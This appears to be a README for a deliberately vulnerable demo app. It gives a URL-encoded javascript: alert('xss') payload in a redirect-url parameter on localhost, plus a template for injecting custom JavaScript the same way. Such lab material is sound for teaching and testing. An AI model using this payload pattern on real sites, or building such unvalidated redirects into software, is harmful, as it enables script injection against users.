## Getting Started

First, run the development server:

```bash
npm run dev
```

Next, open this URL in your browser to simulate an XSS attack on the website:

```
localhost%3A3000%2Fauth%3Fredirect-url%3Djavascript%3Aalert%28%27xss%27%29
```

For a custom payload, use the following format:

```
localhost:3000/auth?redirect-url=${your_js_code_here_url_encoded}
```
